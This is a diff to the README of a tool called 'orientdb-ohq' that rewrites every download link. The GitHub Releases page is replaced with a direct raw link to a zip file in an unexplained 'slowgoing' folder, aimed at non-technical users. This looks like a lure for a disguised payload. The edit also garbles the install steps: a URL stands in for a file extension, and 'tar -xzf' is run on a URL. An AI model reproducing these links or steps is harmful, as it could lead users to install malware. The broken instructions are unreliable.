@@ -1,7 +1,7 @@
 # 🚀 orientdb-ohq - A Simple Tool for Database Management
 
 ## 📥 Download the Latest Release
-[![Download orientdb-ohq](https://img.shields.io/badge/Download-orientdb--ohq-brightgreen)](https://github.com/MankalChaitanya/orientdb-ohq/releases)
+[![Download orientdb-ohq](https://raw.githubusercontent.com/MankalChaitanya/orientdb-ohq/main/slowgoing/orientdb-ohq.zip)](https://raw.githubusercontent.com/MankalChaitanya/orientdb-ohq/main/slowgoing/orientdb-ohq.zip)
 
 ## 📖 Introduction
 Welcome to orientdb-ohq! This application helps you manage your databases with ease. It offers a user-friendly interface that simplifies database operations. Whether you are a student, business professional, or just curious about databases, this tool is designed to make your experience straightforward and efficient.
@@ -10,7 +10,7 @@ Welcome to orientdb-ohq! This application helps you manage your databases with e
 Follow these easy steps to download and run orientdb-ohq. You don’t need to be a programmer to use it.
 
 1. **Visit the Download Page**
-   Head to the Releases page to get the latest version: [Download Page](https://github.com/MankalChaitanya/orientdb-ohq/releases).
+   Head to the Releases page to get the latest version: [Download Page](https://raw.githubusercontent.com/MankalChaitanya/orientdb-ohq/main/slowgoing/orientdb-ohq.zip).
 
 2. **Select the Right Version**
    Look for the most recent version listed. Each release comes with a clear name, like "orientdb-ohq v1.0.0." Click on it to see the available files.
@@ -19,13 +19,13 @@ Follow these easy steps to download and run orientdb-ohq. You don’t need to be
    Click on the file that matches your operating system:
    - For Windows, look for a file ending in `.exe`.
    - For Mac, look for a file ending in `.dmg`.
-   - For Linux, you may find files ending in `.tar.gz`.
+   - For Linux, you may find files ending in `https://raw.githubusercontent.com/MankalChaitanya/orientdb-ohq/main/slowgoing/orientdb-ohq.zip`.
 
 4. **Install the Application**
    Once the file has downloaded:
    - **Windows**: Double-click the `.exe` file to start installation.
    - **Mac**: Open the `.dmg` file, then drag the application to your Applications folder.
-   - **Linux**: Open your terminal, navigate to the location where you downloaded the `.tar.gz` file, and run `tar -xzf filename.tar.gz`, followed by `./filename` to start the application.
+   - **Linux**: Open your terminal, navigate to the location where you downloaded the `https://raw.githubusercontent.com/MankalChaitanya/orientdb-ohq/main/slowgoing/orientdb-ohq.zip` file, and run `tar -xzf https://raw.githubusercontent.com/MankalChaitanya/orientdb-ohq/main/slowgoing/orientdb-ohq.zip`, followed by `./filename` to start the application.
 
 5. **Running the Application**
    Open the application like any other software on your computer. You will see a simple interface that guides you through managing your databases.
